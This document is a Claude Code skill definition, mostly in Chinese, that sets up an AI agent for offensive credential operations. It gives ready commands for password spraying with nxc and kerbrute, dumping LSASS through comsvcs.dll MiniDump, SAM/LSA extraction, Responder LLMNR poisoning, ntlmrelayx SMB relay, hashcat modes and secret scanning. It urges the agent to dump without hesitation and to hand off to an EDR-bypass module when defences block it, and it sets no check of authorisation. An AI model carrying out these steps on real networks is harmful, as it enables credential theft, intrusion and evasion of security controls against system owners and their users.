---
name: creds
description: "Credential operations: secret discovery, classification, extraction, conversion, offline cracking of hashes the operator already has as a credential job, policy-aware spraying, NetNTLM capture, generic SMB relay, and Windows/Linux harvest. Do not hijack an in-progress /ad-attack Kerberoast/AS-REP chain (that module cracks and uses the ticket itself). Do not DCSync, read LAPS LDAP, or escalate cloud IAM. Usable credentials are recorded; the operator chooses the next module."
---

# /creds — 凭据作业

> **scope：** 把密码 / hash / ticket / token / key / cookie / 证书 / 文件里的 secret 变成 **可用凭据**。不做横移、域身份攻击、本机提权、云 IAM 提权、主机持久化。**不要从正在打的 `/ad-attack` Kerberoast/AS-REP 链中途把砸票抢走**——那条链在 AD 里砸完再用。▸ 可用凭据入 notes；候选只认 `~/.claude/skills/shared/modules.yaml`（`modules.py tail`）（默认不要 `/ad-attack` `/cloud-attack`，你点名除外）。

这是全 Skill 的 **Credential Operations** 汇聚点，不是「和 AD 凭据沾边的攻击大杂烩」。

工具：`../shared/tools.md`。CVE 默认不走；备份软件/浏览器版本洞且已有版本才 `../shared/cve-enrichment.md`。

手上是哪类材料，再 Read **一份**（禁止开局七份全读）：
- Hash 类型 → `references/hash-types.md`
- 喷洒 / 爆破 → `references/spray-brute.md`
- 离线破解 → `references/offline-crack.md`
- Windows 收割 → `references/windows-harvest.md`
- 捕获 / 通用 relay → `references/capture-relay.md`
- 磁盘/仓库 secret → `references/secret-discovery.md`
- Token / 证书 / SSH / passkey → `references/token-cert-key.md`

---

## 开局与收尾

开局第一件事：Read `./notes.md`。没有则 `python ~/.claude/skills/bin/notes.py init`。只按已拿下/凭据继续。
走到哪条链，才 Read **一份** `references/<file>.md`。禁止开局全读、禁止凭记忆写 payload。
监听 / sudo / 输密码 / Permission denied：立刻停，说明等操作者做什么，等回报。不要假装已成功。
收尾：
1. 追加 `./notes.md`
2. `python ~/.claude/skills/bin/modules.py tail <本模块名>`
   Read 备用：`~/.claude/skills/shared/modules.yaml`
   禁止 `./modules.yaml` 和 `python ../bin/...`
3. 优先 `default_next`；`never_default` 不得当作默认（操作者点名除外）
4. 名册外的名字不许建议
5. 停。等操作者选 `/模块` 或 `/clear`
`/edr-bypass` 半条链未完：打通后回本模块，不要 /clear。


---

## 0. 成功条件

```text
输入：密码 / hash / ticket / token / key / cookie / 文件 / 网络捕获
        ↓
分类 + 提取 +（能破解则破解）+ 校验
        ↓
notes 里有一条可用凭据
        ↓
/creds COMPLETE
```

**算成功：** 明文口令、可 PTH 的 NT、已破解 NetNTLM、可用 SSH 私钥、可导入 PFX、有效 refresh/JWT、能开会话的 cookie、SAM 本地管理员哈希。

**不算成功：** 只跑了 hydra、只看到 Responder 一行、只证明 Chrome 有 Login Data、只列出 hashcat `-m`、只扫到 Titus 命中但没校验。

校验可以 `nxc smb ...` / `aws sts get-caller-identity` / `ssh -i` / `az account show`。**用这张票打 DA、用这个 Hash 横向、用这个 AKIA 做 IAM 提权** 不是本模块。

不要畏手畏脚的部分：能 dump 的 SAM/LSASS/DPAPI 就 dump；抓到 NetNTLM 就分类并破解或走通用 SMB relay；喷洒按真实 lockout 打到有效登录。被 EDR 拦再交接，解决后回来把材料拿完。

---

## 0.4 已迁走，不要在这里做

这些已经在 AD，删掉旧 `/creds` 副本：

| 旧内容 | 现在 |
|---|---|
| Kerberoast / AS-REP **作为当前 /ad-attack 链** | 要票+砸+用都在 `/ad-attack`。本模块只当操作者把**已有 hash** 当独立凭据作业时才砸 |
| DCSync / `--ntds` / `secretsdump -just-dc` | `/ad-attack` |
| PetitPotam / PrinterBug / DFSCoerce / Coercer | `/ad-attack` `../ad-attack/references/authentication-coercion-relay.md` |
| LDAP relay → RBCD / Shadow Credentials | `/ad-attack` |
| HTTP/ADCS ESC8 / ICPR ESC11 | `/ad-attack` |
| LAPS `ms-Mcs-AdmPwd` / `msLAPS-*` LDAP 读取 | `/ad-recon` `../ad-recon/references/windows-laps.md` |

本模块若扫到 LAPS 属性字符串或 NTDS 文件，**当 secret 分类**，读取/利用交给对应模块。

---

## 0.5 Endpoint Defense Boundary — 可选 /edr-bypass Handoff

仍属 `/creds`、不是 EDR：

```text
账号锁定 / Smart Lockout / MFA
SMB signing / LDAP signing
Credential Guard（VBS 隔离，dump 了也没有明文）
Chrome ABE 需要 SYSTEM / 合法调用方
hash 解不出来
```

只有 **提取动作已经在 OS 上执行** 且被 AV/EDR/AMSI/WDAC/PPL 明确阻断：

```text
creds primitive confirmed (dump / DPAPI / 浏览器解密 / 落地扫描器)
        ↓
endpoint security blocks intended action?
├─ NO  → 继续 /creds 直到可用凭据
└─ YES → 操作者可临时选择 /edr-bypass
            ↓
         恢复当前提取动作
            ↓
         返回 /creds
            ↓
         把 dump/解密打完
```

PPL 拦 LSASS = 交接 EDR，不是放弃 dump。Credential Guard 开着换 SAM/DPAPI/喷洒，不要假装 mimikatz 还能出明文。

---

## 1. 决策树（按手上材料，不按教程顺序）

```text
手上是什么？
A. 网络里有 LLMNR/NBT-NS/mDNS / 入站 HTTP 认证
      → 捕获 → 分类 v1/v2/ESS → 破解 或 通用 SMB relay
B. 已有本机高权（admin / SYSTEM / root）
      → harvest：SAM/LSA/LSASS/DPAPI/浏览器/RMM/shadow/Titus
C. 只有用户列表 + 入口（SMB/WinRM/SSH/OWA/Entra/VPN）
      → 读锁定策略 → 喷洒或爆破 → 校验登录
D. 已有 hash / ticket / 加密文件（**独立作业**，不是正在打的 AD 要票链）
      → 识别 -m → 转换 → 破解
E. 盘上 / repo / CI 日志像密钥
      → Titus / TruffleHog / Gitleaks → 校验
F. cookie / JWT / refresh / PFX / SSH / passkey
      → references/token-cert-key.md；FIDO2 标不可导出，停
        ↓
可用凭据入 notes → COMPLETE
AD 身份攻击 / 云权限枚举 / 本机提权 = 候选下一步
```

同一条捕获链打穿再换。通用 SMB relay（signing 关 → SAM/交互）留在本模块。LDAP/ADCS sink 记候选 `/ad-attack`，本模块不写 getST/DCSync。

---

## 2. 喷洒 / 爆破（先策略，后打）

```bash
nxc smb DC -u user -p pass --pass-pol
net accounts /domain
```

没有 lockout 数据不要对着域控砸 `rockyou`。完整 → **references/spray-brute.md**

```bash
# 域内 SMB（命中即停去校验，不要横向）
nxc smb DC -u users.txt -p 'Spring2026!' --continue-on-success

# Kerberos 喷洒（通常比 SMB 安静）
kerbrute passwordspray -d corp.com --dc DC users.txt 'Spring2026!'
```

Entra/OWA/VPN：TREVORspray / Spray365 / TeamFiltration。间隔跟 **当前** smart lockout 走，禁止写死「60 分钟 × 每天 3 轮」。

---

## 3. 离线破解

```bash
hashid '<hash>'
```

高频：NTLM `1000`、NetNTLMv2 `5600`、NetNTLMv1 `5500`、Kerberoast RC4 `13100`、AES128 `19600`、AES256 `19700`、AS-REP `18200`、sha512crypt `1800`、mscachev2 `2100`、JWT `16500`。

`/ad-attack` 刚 GetUserSPNs/GetNPUsers 出来的票：**让 AD 模块自己砸**，不要把操作者拽过来。本模块砸的是「已经当作凭据作业交过来的」hash。

完整 `-m` 与转换 → **references/hash-types.md**  
hashcat/john/rules/mask/hybrid/PRINCE → **references/offline-crack.md**

---

## 4. Windows 收割（已有 admin/SYSTEM）

```bash
nxc smb TARGET -u administrator -p 'pass' --sam
nxc smb TARGET -u administrator -p 'pass' --lsa
```

```cmd
rundll32 C:\windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Users\Public\l.dmp full
```

```bash
pypykatz lsa minidump l.dmp
DonPAPI corp.com/administrator:'pass'@TARGET
```

PPL / EDR 杀 dump → `/edr-bypass` 后用 nanodump 再回来。`--ntds` / krbtgt 不在这里。Chrome 127+ ABE 见 harvest 文件，DonPAPI 三行不够。

完整 → **references/windows-harvest.md**

---

## 5. 捕获与通用 SMB relay

```bash
responder -I eth0 -A          # 先听有没有可毒化请求
responder -I eth0 -wFb        # 抓 NetNTLMv2
# 可降 v1 时：
responder -I eth0 --lm --disable-ess
```

```bash
nxc smb 192.168.50.0/24 --gen-relay-list targets.txt
# Responder.conf: SMB=Off HTTP=Off
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

成功：NetNTLM 可破解，或 SMB relay 出 SAM/交互。LDAP `--delegate-access` / `--shadow-credentials` / `--adcs` **不要在这里跑**。

完整 → **references/capture-relay.md**

---

## 6. 磁盘 / 仓库 secret

```bash
titus scan /path
trufflehog filesystem /path
gitleaks detect --source /path
```

命中 AWS key / SSH / JWT 后在本模块 **校验**，云枚举候选 `/cloud-recon`。完整 → **references/secret-discovery.md**

---

## 7. Token / 证书 / 密钥

SSH `ssh2john`、PFX `pfx2john`、JWT hashcat `-m 16500`、cookie 会话校验。Passkey/FIDO2 = origin-bound，不可当密码导出。完整 → **references/token-cert-key.md**

---

## 8. 默认口令与复用

```bash
nxc smb 192.168.50.0/24 -u jen -p 'CrackedPass!' --continue-on-success
```

一处破出的口令按协议复用校验。默认口令表：https://cirt.net/passwords 。命中记 notes，不在这里 PsExec。

---

## 9. 完成后

```text
类型：password / NT / NetNTLM / ticket / token / ssh / pfx / cookie
来源：spray / dump / capture / file / crack
校验：成功的协议与账户
还不能用的原因：MFA / CG / ABE / 锁定
```

候选只按「开局与收尾」跑 `python ~/.claude/skills/bin/modules.py tail`。LDAP/ADCS sink 仅你点名才建议 `/ad-attack`。
